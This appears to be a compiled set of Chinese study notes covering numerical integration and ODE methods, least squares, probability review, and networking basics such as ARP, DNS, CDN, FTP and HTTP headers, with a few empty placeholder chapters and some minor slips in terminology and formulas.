<p>$\int_{a}^{b} f(x) dx = (b-a)\sum_{k=0}^{n}C_k^{(n)}f(x_k)$，其中$C_k^{(n)}$称为柯特斯系数。其实$A_k=(b-a)C_k^{(n)}$，就是上面那个插值数值积分的一种形式。只不过上面的$A_k$十分复杂，而这里的$C_k^{(n)}$因为插值点等分，4.1.2式子的更简单的形式。</p>
<p><img src="Basic/Maths/../images/image-20210414104721381.png" alt="image-20210414104721381" /></p>
<p>可以看出C和函数f和积分区间[a,b]都没有关系，只和等分数n有关系。所以我们有：</p>
<ul>
<li>n=1，梯形公式</li>
<li>n=2，Simpson1/3</li>
<li>n=3，Simpson3/8</li>
<li>n=4，Cotes公式</li>
<li>因为和插值公式类似的原因，不推荐阶数较高的公式。</li>
</ul>
<p><img src="Basic/Maths/../images/image-20210414104820536.png" alt="image-20210414104820536" /></p>
<p>容易看出，当积分区间[a,b]较大时，直接使用牛顿-柯特斯公式所得积分近似值的精度是很难得到保证的。因此 ，在实际应用中，为了既能提高结果的精度，又使算法简便且易在电子计算机上实现，往往采用复合求积的方法。
所谓复合求积 ，就是先将积分区间分成几个小区间，并在每个小区间上用低阶牛顿 一 柯特斯公式计算积分 的近似值 ，然后对这些近似值求和 ，从而得到所求积分的近似值 。由此得到的一些具有更大实用价值的数值求积公式 ，统称为复合求积公式。</p>
<h3 id="龙贝格romberg积分"><a class="header" href="#龙贝格romberg积分">龙贝格（Romberg）积分</a></h3>
<p>更快速的收敛。</p>
<p><img src="Basic/Maths/../images/image-20210414110145021.png" alt="image-20210414110145021" /></p>
<p>T就是你要的积分。</p>
<h3 id="高斯gauss求积公式"><a class="header" href="#高斯gauss求积公式">高斯（Gauss）求积公式</a></h3>
<h2 id="常微分方程"><a class="header" href="#常微分方程">常微分方程</a></h2>
<p>含有未知函数及其导数的方程——微分方程(Differential Equations)</p>
<p>被微分的量(v)称为应变量(Dependent  Variable)，与v的微分有关的量t称为自变量(Independent Variable)。如果函数只含有一个自变量，方程称为<strong>常微分方程</strong>(ODE,  OrdinaryDifferential  Equation)。如果函数含有两个或更多自变量，称为<strong>偏微分方程</strong>(PDE, Partial Differential Equation)。</p>
<p>定解条件：给出积分曲线在初始点的状态(初始条件)，相应的定解问题称为<strong>初值问题</strong>；给出积分曲线首尾两端的状态(边界条件)，称为<strong>边值问题</strong>。</p>
<p>我们的数值解法，求得不是函数，是一系列离散点的值。数值解法求问题的解y(x)在一系列点$a=x0&lt;x1&lt;x2&lt;...&lt;xn=b$上值$y(xi)$的近似值$yi( i=0,1,2,...,n)$。相邻的两个节点之间的距离$hi=xi+1-xi$称为由$xi$到$xi+1$的步长，通常取成常量$h$，称为等步长，此时$xi=x0+ih(i=1,2, ...,n)$或$xi+1=xi+hi(i=0,1,2, ...,n-1)$。</p>
<ul>
<li>初值问题的数值解法
<ul>
<li>欧拉（Euler）法</li>
<li>龙格-库塔（Runge-Kutta）法</li>
<li>微分方程组和高阶微分方程</li>
<li>多步法</li>
</ul>
</li>
<li>边值问题
<ul>
<li>打靶法</li>
<li>差分法</li>
</ul>
</li>
</ul>
<h3 id="欧拉euler法"><a class="header" href="#欧拉euler法">欧拉（Euler）法</a></h3>
<p>新值=旧值+斜率×步长。简单但是精度不高。</p>
<p>向前差商：由泰勒公式可以得到$\frac {y(x_{i+1}-x_i)}{h}=y'(x_i)+h/2y''(\Epsilon)$，然后通过移项得到$y(x_{i+1}=y(x_i)+hf(x_i,y(x_i))+h^2/2y''(\Epsilon)$。然后把最后一项舍去当作误差。可以发现误差是会累积的。</p>
<h3 id="龙格-库塔runge-kutta法"><a class="header" href="#龙格-库塔runge-kutta法">龙格-库塔（Runge-Kutta）法</a></h3>
<h3 id="微分方程组和高阶微分方程"><a class="header" href="#微分方程组和高阶微分方程">微分方程组和高阶微分方程</a></h3>
<h3 id="多步法"><a class="header" href="#多步法">多步法</a></h3>
<h3 id="打靶法"><a class="header" href="#打靶法">打靶法</a></h3>
<h3 id="差分法"><a class="header" href="#差分法">差分法</a></h3>
<div style="break-before: page; page-break-before: always;"></div><h1 id="最小二乘法"><a class="header" href="#最小二乘法">最小二乘法</a></h1>
<h2 id="最小二乘法-1"><a class="header" href="#最小二乘法-1">最小二乘法</a></h2>
<p>最小二乘法可能是入门机器学习的第一课吧，在拟合方面十分管用。
如何理解最小二乘法，这个链接很好：<a href="https://www.zhihu.com/question/37031188/answer/411760828">最小二乘法的本质是什么？ - 马同学的回答 - 知乎</a>。</p>
<h3 id="举例"><a class="header" href="#举例">举例</a></h3>
<p>为确定电阻随温度变化的关系式，测得不同温度下的电阻如表一。试用最小二乘法确定关系式：$R=a +b*t$。
表一 电阻随温度变化的关系</p>
<div class="table-wrapper"><table><thead><tr><th>t_i</th><th>r_i</th></tr></thead><tbody>
<tr><td>19.0</td><td>76.30</td></tr>
<tr><td>25.0</td><td>77.80</td></tr>
<tr><td>30.1</td><td>79.75</td></tr>
<tr><td>36.0</td><td>80.80</td></tr>
<tr><td>40.0</td><td>82.35</td></tr>
<tr><td>45.1</td><td>83.90</td></tr>
<tr><td>50.0</td><td>85.10</td></tr>
</tbody></table>
</div>
<p>解：
误差表达式：$S=\Sigma{(r(t_i)-r_i)^2}=\Sigma{(a+b<em>t_i-r_i)^2}$。
我们的目的是求出让S最小的参数a和b，运用我们的微积分知识，对a和b分别求偏导数，当它们为0的时候就取到了最小值。（不严谨，不是对所有的函数都是这样子的。所以最小二乘法不是对所有的函数都适用的。）
$\frac{\partial S}{\partial a}=\Sigma {2(a+b</em>t_i-r_i)}=0$（1）
$\frac{\partial S}{\partial b}=\Sigma {2(a+b*t_i-r_i)t_i}=0$（2）</p>
<p>所以我们可以求出$\Sigma t_i,\Sigma t_i^2,\Sigma R_it_i,\Sigma Ri$，问题就是一个求解二元一次方程组的过程了。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="有限自动机介绍"><a class="header" href="#有限自动机介绍">有限自动机介绍</a></h1>
<p>挖坑</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="概统复习"><a class="header" href="#概统复习">概统复习</a></h1>
<p>参考链接：
视频：https://www.bilibili.com/video/BV1Hb411F7zV?p=8
笔记：https://zhuanlan.zhihu.com/p/87218271</p>
<p><img src="Basic/Maths/../images/1597106145232.png" alt="" /></p>
<center>概率基础</center>
<p><img src="Basic/Maths/../images/1597106336527.png" alt="" /></p>
<center>单变量分布，这里F（x）的积分上下限反了</center>
<p><img src="Basic/Maths/../images/1597106355542.png" alt="" /></p>
<center>多变量分布，请把这里g(x,y)和上一张g(x)的期望结合起来看。这里的f(x,y)最好画个图方便理解，也不容易搞错积分的上下限。</center>
<p><img src="Basic/Maths/../images/1597106393811.png" alt="" />
<img src="Basic/Maths/../images/1597062774355.png" alt="" /></p>
<center>常见分布，几何分布的x和n后面反了</center>
一点证明思路：
二项分布的期望：用组合数的公式把x放到组合数里，或者看成伯努利分布的和。
帕斯卡分布的期望：幂级数求和，伽马函数。
几何分布的期望和方差：看成帕斯卡分布的和。利用期望的性质 和 独立事件方差的性质。
<p>--</p>
<p><img src="Basic/Maths/../images/1596960383305.png" alt="" /></p>
<center>利用分布函数求概率，求概率可要小心了</center>
<p><img src="Basic/Maths/../images/1596959094636.png" alt="" /></p>
<center>独立的性质</center>
<p><img src="Basic/Maths/../images/1597041139839.png" alt="" /></p>
<center>二维高斯的性质</center>
<p><img src="Basic/Maths/../images/1597045278163.png" alt="" /></p>
<center>期望的性质</center>
<p><img src="Basic/Maths/../images/1597045300116.png" alt="" /></p>
<center>方差的性质</center>
<h2 id="大数定理和中央极限定理"><a class="header" href="#大数定理和中央极限定理">大数定理和中央极限定理</a></h2>
<p>大数定理就是在说 均值依概率收敛于期望。</p>
<ul>
<li>辛钦大数定理🏴：随机变量 $$ X_1,X_2,...X_n $$ 相互<strong>独立</strong>，且<strong>服从同一分布</strong>，具有期望E(X_K)=u，那么Sample Mean（前n个随机变量的算术平均）依概率收敛于期望u。</li>
<li>伯努利大数定理：f_A是n次独立重复试验中事件A发生的次数，p是事件A在每次试验中发生的概率，f_A/n收敛于p。</li>
<li>马尔科夫不等式🏴：<img src="Basic/Maths/../images/1597309422730.png" alt="" /></li>
<li>切比雪夫不等式🏴：<img src="Basic/Maths/../images/1597309430421.png" alt="" />
说明随机变量X偏离EX越大，则其概率越小。只能估计随机事件偏离期望的概率。好处是不需要知道随机变量X的分布，只需要知道期望方差就行了。</li>
<li>中央极限定理🏴：随机变量 $$ X_1,X_2,...X_n $$ 相互<strong>独立</strong>，且<strong>服从同一分布</strong>，具有<strong>相同的数学期望和方差</strong>，则随机变量之和
<img src="Basic/Maths/../images/1597308469067.svg" alt="" /></li>
<li>棣莫弗-拉普拉斯定理：注意到E=np,D=np(1-p)
<img src="Basic/Maths/../images/1597309029383.png" alt="" /></li>
</ul>
<h2 id="点估计-1"><a class="header" href="#点估计-1">点估计</a></h2>
<p>点估计，利用实验值估计概率模型中的参数，准确的说是<strong>用样本统计量来估计总体参数</strong>。
利用点估计，我得到对模型中某参数的估计值（需要注意的是，它是一个定义在抽样空间上的随机变量），记为 $\hat{R}$ ，并假定该参数的真实值为 r。
对估计良好程度的评价标准：
无偏估计（unbiased estimator）：<img src="Basic/Maths/../images/1597329059945.svg" alt="" />
渐进无偏估计：
一致估计（consistent estimator)：<img src="Basic/Maths/../images/1597328552495.svg" alt="" />
对一个无偏估计(对无偏估计，$e = Var(\hat{R})$)，如果$\lim _{n-&gt;+\infty} e = 0$，那么他也是一致估计。
MSE（有效性的比较）$e=E[(\hat{R} - r)^2]$，SE：$\sqrt{e}$</p>
<p>以下是对期望和方差的点估计：
Sample mean：$M_n(x) = \frac{X_1+X_2+...X_n}{n}$是<strong>期望</strong>的无偏估计。
$Var[M_n(x)] = e = Var(X)/n$
我们让$W=(X-\mu _x)^2$，那么W的sample mean$M_n(W) = \frac{W_1+W_2+...W_n}{n}$就是对<strong>方差</strong>的无偏估计。
但是如果X的期望未知，我们就用sample mean来代替期望。于是我们得到$V_n(X) = \frac{1}{n}\sum _{i=1} ^n (X_i-M_n(X))^2$，不过$E[V_n(X)] = \frac{n-1}{n}Var[x]$，所以我们让$V'_n(X) = \frac{1}{n-1}\sum _{i=1} ^n (X_i-M_n(X))^2$，这样就是<strong>方差</strong>的无偏估计了。</p>
<h2 id="老师没讲的但是很重要的"><a class="header" href="#老师没讲的但是很重要的">老师没讲的但是很重要的</a></h2>
<p>矩和中心矩：
$E[X^n] \ \ E[(X-\mu _x)^n]$
协方差矩阵，估计的方法</p>
<h2 id="老师讲的"><a class="header" href="#老师讲的">老师讲的</a></h2>
<p><img src="Basic/Maths/../images/1599200936162.png" alt="" />
<img src="Basic/Maths/../images/1599200943423.png" alt="" />
<img src="Basic/Maths/../images/1599200952458.png" alt="" />
<img src="Basic/Maths/../images/1599200959341.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="群论简介"><a class="header" href="#群论简介">群论简介</a></h1>
<p>挖坑</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
<p>这一系列文章并没有明确的阅读顺序，因为网络的知识点是零碎的，面向实践的。</p>
<ul>
<li>应用层：<a href="Basic/Networking/./HTTP.html">HTTP</a> <a href="Basic/Networking/./Mail.html">Mail</a> <a href="Basic/Networking/./DNS.html">DNS</a> <a href="Basic/Networking/./FTP.html">FTP</a> <a href="Basic/Networking/P2P.html">P2P</a></li>
<li>传输层：<a href="Basic/Networking/./TCP.html">TCP</a> <a href="Basic/Networking/./UDP.html">UDP</a></li>
<li>网络层：<a href="Basic/Networking/./%E7%BD%91%E7%BB%9C%E5%B1%82.html">网络层</a> <a href="Basic/Networking/./%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE.html">路由协议</a> <a href="Basic/Networking/./ARP.html">ARP</a> <a href="Basic/Networking/./ICMP.html">ICMP</a> <a href="Basic/Networking/VPN.html">VPN</a> <a href="Basic/Networking/./NAT.html">NAT</a></li>
<li>链路层：<a href="Basic/Networking/./%E9%93%BE%E8%B7%AF%E5%B1%82.html">链路层</a> <a href="Basic/Networking/./%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82.html">介质访问子层</a></li>
<li>物理层：<a href="Basic/Networking/./%E7%89%A9%E7%90%86%E5%B1%82.html">物理层</a></li>
<li>通用主题： <a href="Basic/Networking/./%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E5%92%8C%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6.html">拥塞控制和流量控制</a> <a href="Basic/Networking/./%E5%B7%AE%E9%94%99%E6%8E%A7%E5%88%B6.html">差错控制</a> <a href="Basic/Networking/./%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93.html">可靠传输</a> </li>
<li>其他主题：<a href="Basic/Networking/./%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87.html">网络设备</a>  <a href="Basic/Networking/./Socket.html">Socket</a></li>
</ul>
<p>其他是和考试无关的主题</p>
<h2 id="层次模型"><a class="header" href="#层次模型">层次模型</a></h2>
<p><img src="Basic/Networking/../images/102219_1135_TCPIPvsOSIM1.png" alt="img" /></p>
<h2 id="性能衡量指标"><a class="header" href="#性能衡量指标">性能衡量指标</a></h2>
<ul>
<li>
<p>带宽（Bandwidth）。 本来表示通信线路允许通过的信号频带范围，单位是赫兹（Hz）。而在计算机网络中，带宽表示网络的通信线路所能传送数据的能力，是数字信道所能传送的&quot;最高数据传输速率&quot;的同义语，单位是比特/秒（b/s）。</p>
</li>
<li>
<p>吞吐量（Throughput）。指单位时间内通过某个网络（或信道、接口）的数据量。吞吐量受网络带宽或网络额定速率的限制。单位也是比特/秒（b/s）。</p>
<blockquote>
<p><strong>Throughput</strong>是指网络中主机（server和client）之间的<strong>实际</strong>数据传输速率，即单位时间内实际传输的数据量，常用的单位有Kbps,Mbps。而<strong>Bandwidth</strong>是指网络的<strong>最大</strong>数据传输速率，常用单位也是Kbps,Mbps。</p>
</blockquote>
</li>
<li>
<p>时延（Delay）。指数据（一个报文或分组）从网络（或链路）的一端传送到另一端所需要的总时间。它由4部分构成∶发送时延、传播时延、处理时延和排队时延。</p>
<ul>
<li>
<p><strong>发送时延propagation delay</strong>。结点将分组的所有比特推向（传输）链路所需的时间，即从发送分组的第一个比特算起，到该分组的最后一个比特发送完毕所需的时间，因此也称传输时延。计算公式为</p>
<p>$发送时延 = 分组长度/信道宽度$。信道宽度是指<strong>信道的最大数据传输速率maximum data transmission rate</strong>。</p>
</li>
<li>
<p><strong>传播时延propagation delay</strong>。电磁波在信道中传播一定的距离需要花费的时间，即一个比特从链路的一端传播到另一端所需的时间。计算公式为</p>
<p>$传播时延 = 信道长度/电磁波在信道上的传播速率$</p>
</li>
<li>
<p>处理时延。数据在交换结点为存储转发而进行的一些必要的处理所花费的时间。例如，分析分组的首部、从分组中提取数据部分、进行差错检验或查找适当的路由等。</p>
</li>
<li>
<p>排队时延。分组在进入路由器后要先在输入队列中排队等待处理。路由器确定转发端口后，还要在输出队列中排队等待转发，这就产生了排队时延。</p>
</li>
</ul>
<p>因此，$总时延=发送时延+传播时延+处理时延+排队时延$。不过后两者一般不考虑。</p>
</li>
<li>
<p>时延带宽积。发送端发送的第一个bit即将到达终点的时候，发送端已经发送了多少个bit。</p>
</li>
<li>
<p>往返时延（Round Trip Time，RTT）。指从发送端发送数据开始，到发送端收到<strong>来自接收端的确认</strong>，总共经历的时延。如果我们假设接收端在收到数据之后立即发送确认并忽略确认帧的长度的话，</p>
<p>$RTT = 发送时延 + 传播时延 \times 2$</p>
</li>
<li>
<p><strong>信道利用率（Channel Utilization）</strong>。指出某一信道有百分之多少的时间是有数据通过的，即信道利用率 = 有数据通过时间/（有+无）数据通过时间。一般来说，如果是需要确认的话，可以用下面的公式计算
$$
信道利用率 = \frac{发送时延}{发送时延+往返传输时延}
$$</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="networking-arp"><a class="header" href="#networking-arp">Networking-ARP</a></h1>
<p>ARP 协议的全称是 <code>Address Resolution Protocol(地址解析协议)</code>，它是一个通过<strong>用于实现从 IP 地址到 MAC 地址的映射，即询问目标 IP 对应的 MAC 地址</strong> 的一种协议。ARP 协议在 IPv4 中极其重要。ARP协议是位于网络层(和IP协议同层)。</p>
<p>一个典型的ARP Package只包含4个主要内容,也就是下面列出的后面四个字段。</p>
<pre><code>Address Resolution Protocol (request)
    Hardware type: Ethernet (1)
    Protocol type: IPv4 (0x0800)
    Hardware size: 6
    Protocol size: 4
    Opcode: request (1)
    Sender MAC address: 02:42:ac:11:00:02 (02:42:ac:11:00:02)
    Sender IP address: 172.17.0.2
    Target MAC address: 00:00:00_00:00:00 (00:00:00:00:00:00)
    Target IP address: 172.17.0.1

Address Resolution Protocol (reply)
    Hardware type: Ethernet (1)
    Protocol type: IPv4 (0x0800)
    Hardware size: 6
    Protocol size: 4
    Opcode: reply (2)
    Sender MAC address: 02:42:9a:d3:55:f5 (02:42:9a:d3:55:f5)
    Sender IP address: 172.17.0.1
    Target MAC address: 02:42:ac:11:00:02 (02:42:ac:11:00:02)
    Target IP address: 172.17.0.2
</code></pre>
<ul>
<li>为什么上面的Target MAC Address不是<code>ff:ff:ff:ff:ff:ff</code>表示广播呢？太年轻啦。目标MAC地址是在链路层的数据头部的，这里的<code>00:00:00:00:00:00</code>其实只是空了一个位置而已。</li>
<li>一个典型的应用场景，就是我需要获得局域网中另一个机器的MAC地址(比如查找路由器，或者我ping局域网内其他主机的时候)。这时我就会广播一个ARP Request，局域网内所有的机器都会收到，然后和自己的IP核对一下，对上了就返回ARP Reply告知自己的MAC地址。</li>
</ul>
<p><strong>ARP 是一种非常不安全的协议</strong>，目前已经有很多涉及 ARP 的攻击，最主要的就是使用代理 ARP 功能假扮主机，对 ARP 请求作出应答，通过伪造 ARP 数据包来窃取合法用户的通信数据，造成影响网络传输速率和盗取用户隐私信息等严重危害。</p>
<p>在Windows中，我们可以用<code>arp -d</code>清除ARP缓存。用<code>arp -a</code>查看ARP缓存。</p>
<hr />
<p><a href="https://mp.weixin.qq.com/s?__biz=MzI0ODk2NDIyMQ==&amp;mid=2247487804&amp;idx=1&amp;sn=f001a24a308053b3723dfb12d36045ee&amp;chksm=e999e42edeee6d383fbb411792e22e4028bb8c2441255786f50cf848443af7b1bd5e382078dc&amp;token=933742694&amp;lang=zh_CN#rd">参考链接</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cdn"><a class="header" href="#cdn">CDN</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dns"><a class="header" href="#dns">DNS</a></h1>
<!-- toc -->
<h2 id="域名"><a class="header" href="#域名">域名</a></h2>
<blockquote>
<p>网域名称（英语：Domain Name，简称：Domain），简称域名、网域，是由一串用点分隔的字符组成的互联网上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位。<strong>域名可以说是一个IP地址的代称</strong>，目的是为了便于记忆后者。例如，<code>wikipedia.org</code>是一个域名。人们可以直接访问wikipedia.org来代替IP地址，然后域名系统（DNS）就会将它转化成便于机器识别的IP地址。这样，人们只需要记忆wikipedia.org这一串带有特殊含义的字符，而不需要记忆没有含义的数字。</p>
</blockquote>
<p>在上面的例子中，<code>org</code>就是<strong>顶级域名</strong>，一般来说顶级域名分成通用（如<code>com</code>,<code>org</code>）和国家地区（如<code>cn</code>）两种。域名的组织和我们习惯的路径表示是相反的，上面的例子中用<code>/org/wikipedia</code>更符合我们表示路径树的习惯。</p>
<p>每个域控制他的子域。cs.zju.edu.cn中的edu就是cn的子域，zju就是edu的子域。</p>
<p>对于英文字符来说，是不区分大小写的。</p>
<h2 id="dns-1"><a class="header" href="#dns-1">DNS</a></h2>
<p>域名的最终目的是映射到IP地址上，这个转换过程就是DNS的工作。</p>
<p>一条资源记录是一个五元组</p>
<div class="table-wrapper"><table><thead><tr><th>名称</th><th>内容</th></tr></thead><tbody>
<tr><td>Domain_name</td><td>这条记录适用于哪个域</td></tr>
<tr><td>Time_to_live</td><td>该记录的稳定程度</td></tr>
<tr><td>Class</td><td>对于Internet信息，总是IN</td></tr>
<tr><td>Type</td><td>类型，常见的有<code>A</code>代表IPv4地址，<code>AAAA</code>代表IPv6地址。详见下。</td></tr>
<tr><td>Value</td><td>值，内容具体取决于Type。如<code>A</code>的话就是地址，<code>CNAME</code>的话就是canonical name。</td></tr>
</tbody></table>
</div>
<p>Type都可以是什么字段：</p>
<ul>
<li>A: 32 bit IPv4 address</li>
<li>AAAA: 128 bit IPv6 address</li>
<li>MX: 一台准备接受该特定域名电子邮件主机的名字</li>
<li>NS: 一台用于所在域和子域的名字服务器</li>
<li>CNAME: 允许记录创建别名（canonical name的直译是标准名，我感觉标准名更贴切）</li>
<li>...</li>
</ul>
<h2 id="dns服务器"><a class="header" href="#dns服务器">DNS服务器</a></h2>
<p>如果有一台服务器能接受全世界所有的DNS请求然后返回，那就没那么多事了。不过实际上并没有这么厉害的服务器。</p>
<p>作为个人用户，我们就向我们配置的<strong>本地DNS服务器</strong>发送请求。</p>
<ul>
<li>如果找到了（可能是权威记录，或者是还没有过期的缓存记录），就可以直接返回了</li>
<li>找到了部分记录（比如下图中，如果我已经缓存了edu服务器的地址），就可以从中间开始迭代查询。</li>
<li>如果啥也没找到，就依次根据域名从<strong>根服务器</strong>开始查询过来。就是下图的情况。
<ul>
<li>发起方向本地服务器查询的过程是<strong>递归查询</strong>。</li>
<li>本地服务器向根域名服务器查询的过程是<strong>递归查询</strong>。</li>
</ul>
</li>
</ul>
<p><img src="Basic/Networking/../images/image-20211130144052599.png" alt="image-20211130144052599" /></p>
<p>根服务器全球共13个（逻辑上13个，不是物理上13个）。中国并没有。</p>
<p>DNS以前采用UDP作为传输层协议，不过现在也有用TCP的了。</p>
<h2 id="反向代理"><a class="header" href="#反向代理">反向代理</a></h2>
<p>https://cloud.tencent.com/developer/article/1418457</p>
<blockquote>
<p>正向代理（forward proxy）：是一个位于客户端和目标服务器之间的服务器(代理服务器)，为了从目标服务器取得内容，客户端向代理服务器发送一个请求并指定目标，然后代理服务器向目标服务器转交请求并将获得的内容返回给客户端。</p>
<p>反向代理（reverse proxy）：是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p>
<p><strong>所以，正向代理，其实是&quot;代理服务器&quot;代理了&quot;客户端&quot;，去和&quot;目标服务器&quot;进行交互。反向代理，其实是&quot;代理服务器&quot;代理了&quot;目标服务器&quot;，去和&quot;客户端&quot;进行交互。</strong></p>
</blockquote>
<p>反向代理的用途</p>
<ul>
<li>隐藏服务器真实IP。使用反向代理，可以对客户端隐藏服务器的IP地址。</li>
<li>负载均衡。反向代理服务器可以做负载均衡，根据所有真实服务器的负载情况，将客户端请求分发到不同的真实服务器上。</li>
<li>提高访问速度。反向代理服务器可以对于静态内容及短时间内有大量访问请求的动态内容提供缓存服务，提高访问速度。</li>
<li>提供安全保障。反向代理服务器可以作为应用层防火墙，为网站提供对基于Web的攻击行为（例如DoS/DDoS）的防护，更容易排查恶意软件等。还可以为后端服务器统一提供加密和SSL加速（如SSL终端代理），提供HTTP访问认证等。</li>
</ul>
<h3 id="内容分发网络-cdn"><a class="header" href="#内容分发网络-cdn">内容分发网络 CDN</a></h3>
<blockquote>
<p>内容分发网络CDN是指一种通过过互联网互相连接的电脑网络系统，利用最靠近每位用户的服务器，更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户，来提供高性能、可扩展性及低成本的网络内容传递给用户。</p>
</blockquote>
<p>当用户访问使用CDN服务的网站时，本地DNS服务器通过CNAME方式将最终域名请求重定向到CDN服务。CDN通过一组预先定义好的策略(如内容类型、地理区域、网络负载状况等)，将当时能够最快响应用户的CDN节点IP地址提供给用户，使用户可以以最快的速度获得网站内容。使用CDN后的HTTP请求处理流程如下：</p>
<img src="Basic/Networking/../images/diagram-12@3x.png" alt="Imperva CDN Guide: Start Using a CDN" style="zoom: 67%;" />
<div style="break-before: page; page-break-before: always;"></div><h1 id="ftp"><a class="header" href="#ftp">FTP</a></h1>
<p>文件传输协议(File Transfer Protocal, FTP)是使用广泛的文件传输协议。提供交互式的访问，允许用户指明文件的类型和格式，并允许文件具有存取权限。屏蔽了计算机系统的细节，适合于在异构网络中任意计算机之间传送文件。</p>
<h2 id="控制连接和数据连接"><a class="header" href="#控制连接和数据连接">控制连接和数据连接</a></h2>
<p>FTP在工作时使用两个并行的FTP连接：</p>
<ul>
<li>控制连接（端口号21）：服务器监听21号端口，等待客户连接。控制连接用来传输控制信息，如连接请求传送请求等，控制信息都以7位ASCII传送。</li>
<li>数据连接（端口号20）：控制进程接收到FTP客户发来的文件传输请求后，创建数据传送进程，建立数据连接。完成实际文件的传送。数据连接的建立有主动模式和被动模式，被动模式是为了避免因为客户端防火墙导致的一些问题。
<ol>
<li>主动模式：客户端从一个任意的非特权端口N（N&gt;1024,如1026端口）连接到FTP服务器的21端口。然后客户端开始监听N+1（如1027端口），并发送FTP命令“port N+1”到FTP服务器。接着服务器会从它自己的数据端口（20）连接到客户端指定的数据端口（N+1）。</li>
<li>被动模式：当开启一个FTP连接时，客户端打开两个任意的非特权本地端口N和N+1（如1026端口和1027端口）。第一个端口连接服务器的21端口，客户端提交PASV命令给服务端，这样做的结果是服务器会开启一个任意的非特权端口（P&gt;1024），并发送PORT P（如2024）命令给客户端。然后客户端发起从本地端口N+1到服务器的端口P的连接用来传送数据。</li>
</ol>
</li>
</ul>
<p><a href="https://zh.wikipedia.org/wiki/FTP%E5%91%BD%E4%BB%A4%E5%88%97%E8%A1%A8">FTP命令列表参考</a></p>
<h2 id="sftp"><a class="header" href="#sftp">SFTP</a></h2>
<p>SSH文件传输协议（缩写：SFTP）可用于传输文件并具有类似的用户命令集，但使用Secure Shell协议（SSH）传输文件。与FTP不同，它对命令和数据进行加密，防止密码和敏感信息通过网络公开传输。它无法与FTP兼容。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="http"><a class="header" href="#http">HTTP</a></h1>
<!-- toc -->
<h2 id="基本知识"><a class="header" href="#基本知识">基本知识</a></h2>
<p>HTTP自诞生以来有几个版本，现在最常用的HTTP/1.1。</p>
<p>HTTP是工作在应用层上的。下面一层利用TCP协议进行传输。</p>
<p>学习一个东西的最好方法是动手实践一下，我们可以用socket实现一个简单的、利用HTTP进行消息传输的<a href="https://github.com/reticenceji/static-web"><strong>服务器</strong></a>，或者是用Wireshark进行抓包。</p>
<p>HTTP<strong>无状态</strong>、使用<strong>统一资源标识符（URI）</strong>、利用一定格式的<strong>请求和响应报文</strong>进行通信。</p>
<h2 id="结构-1"><a class="header" href="#结构-1">结构</a></h2>
<p>HTTP 首部字段根据实际用途被分为以下 4 种类型。</p>
<ol>
<li>通用首部字段（General Header Fields）：请求报文和响应报文两方都会使用的首部</li>
<li>请求首部字段（Request Header Fields）：从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信息、响应内容相关优先级等信息。</li>
<li>响应首部字段（Response Header Fields）：从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。</li>
<li>实体首部字段（Entity Header Fields）：针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息。</li>
</ol>
<blockquote>
<p>通用首部字段</p>
</blockquote>
<div class="table-wrapper"><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody>
<tr><td>Cache-Control</td><td>控制缓存的行为</td></tr>
<tr><td>Connection</td><td>控制不再转发给代理的首部字段、管理持久连接</td></tr>
<tr><td>Date</td><td>创建报文的日期时间</td></tr>
<tr><td>Pragna</td><td>报文指令</td></tr>
<tr><td>Trailer</td><td>报文末端的首部一览</td></tr>
<tr><td>Transfer-Encoding</td><td>指定报文主体的传输编码方式</td></tr>
<tr><td>Upgrade</td><td>升级为其它协议</td></tr>
<tr><td>Via</td><td>代理服务器的相关信息</td></tr>
<tr><td>Warning</td><td>错误通知请求首部字段</td></tr>
</tbody></table>
</div>
<blockquote>
<p>请求首部字段</p>
</blockquote>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">首部字段名</th><th style="text-align: left">说明</th></tr></thead><tbody>
<tr><td style="text-align: left">Accept</td><td style="text-align: left">用户代理可处理的媒体类型</td></tr>
<tr><td style="text-align: left">Accept-Charset</td><td style="text-align: left">优先的字符集</td></tr>
<tr><td style="text-align: left">Accept-Encoding</td><td style="text-align: left">优先的内容编码</td></tr>
<tr><td style="text-align: left">Accept-Language</td><td style="text-align: left">优先的语言(自然语言)</td></tr>
<tr><td style="text-align: left">Authorization</td><td style="text-align: left">Web认证信息</td></tr>
<tr><td style="text-align: left">Expect</td><td style="text-align: left">期待服务器的指定行为</td></tr>
<tr><td style="text-align: left">From</td><td style="text-align: left">用户的电子邮箱地址</td></tr>
<tr><td style="text-align: left">Host</td><td style="text-align: left">请求资源所在服务器</td></tr>
<tr><td style="text-align: left">if-Match</td><td style="text-align: left">比较实体标记(ETag)</td></tr>
<tr><td style="text-align: left">if-Modified-Since</td><td style="text-align: left">比较资源的更新时间</td></tr>
<tr><td style="text-align: left">if-None-Match</td><td style="text-align: left">比较实体标记(与if-Match相反)</td></tr>
<tr><td style="text-align: left">if-Range</td><td style="text-align: left">资源为更新时发送实体Byte的范围请求</td></tr>
<tr><td style="text-align: left">if-Unmodified-Since</td><td style="text-align: left">比较资源的更新时间(与if-Modified-Since相反)</td></tr>
<tr><td style="text-align: left">Max-Forwards</td><td style="text-align: left">最大传输逐跳数</td></tr>
